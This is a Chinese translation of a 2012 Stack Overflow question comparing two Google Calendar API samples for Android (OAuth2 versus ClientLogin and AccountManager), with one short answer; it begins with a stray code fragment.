strokeOpacity: 0.45,
strokeWeight: 5 
```

# android - 2 个不同的 Google 日历示例代码 - 我应该应用哪些示例？

> ID：10991997
> 
> 赞同：1
> 
> 时间：2012-06-12T07:13:32.413
> 
> 标签：android, google-api, google-calendar-api, google-api-java-client

我浏览了 2 个不同的 Google 日历代码示例。读完之后，我越来越糊涂了。

[https://developers.google.com/google-apps/calendar/instantiate](https://developers.google.com/google-apps/calendar/instantiate)

*   他们正在使用 oAuth2？
*   他们正在使用范围`https://www.googleapis.com/auth/calendar`。是因为他们使用的是oAuth2吗？
*   他们需要 2 个 API 密钥`clientId`和`clientSecret`. 是因为他们使用的是oAuth2吗？
*   他们正在使用`com.google.api.services.calendar.Calendar`.

* * *

[http://code.google.com/p/google-api-java-client/source/browse/calendar-android-sample/src/main/java/com/google/api/services/samples/calendar/android/ CalendarSample.java?repo=samples](http://code.google.com/p/google-api-java-client/source/browse/calendar-android-sample/src/main/java/com/google/api/services/samples/calendar/android/CalendarSample.java?repo=samples)

*   他们正在使用 ClientLogin？
*   范围是`cl`？是因为他们使用的是 ClientLogin 吗？
*   它们只需要 1 个简单的 API 访问密钥。是因为他们使用的是 ClientLogin 吗？
*   他们正在使用`com.google.api.services.calendar.model.Calendar`. 有什么区别`com.google.api.services.calendar.Calendar`？

**我的目标平台是安卓。我应该使用第一个示例还是第二个示例中的方法？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:57:21.463

第二个示例是使用[AccountManager](http://developer.android.com/reference/android/accounts/AccountManager.html)的 Android 功能，它可以访问 Android 设备上存储的帐户信息。AccountManager 类将在后台执行 OAuth，因此开发人员不需要这样做。请参阅[上一个问题](https://stackoverflow.com/questions/6649388/android-accountmanager-authtoken-and-oauth)。